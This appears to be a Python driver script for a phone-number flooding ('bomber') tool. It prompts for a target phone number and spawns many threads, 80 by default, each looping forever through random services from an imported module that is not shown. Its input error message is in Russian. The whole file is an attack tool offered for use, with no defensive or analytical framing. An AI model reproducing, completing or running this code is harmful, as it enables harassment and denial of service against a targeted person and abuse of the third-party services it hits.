import sys, os, pyfiglet
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
	attack_number_phone.phone(phone)

	while True:
	    try:
	        attack_number_phone.random_service()
	    except Exception as ex:
	    	print(ex)

os.system('clear')

print(Fore.YELLOW + pyfiglet.figlet_format("ANTI"))
print('============')
phone = input('Phone: ')
print('============')

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + 'Неверный формат ввода.\nВведите номер в формате +xxxxxxxxxxxx')
	sys.exit()

try:
	threads = int(input('Threads: '))
except:
	threads = 80
	
print('============')

for i in range(threads):
	th = Thread(target=start, args=(phone,))
	th.start()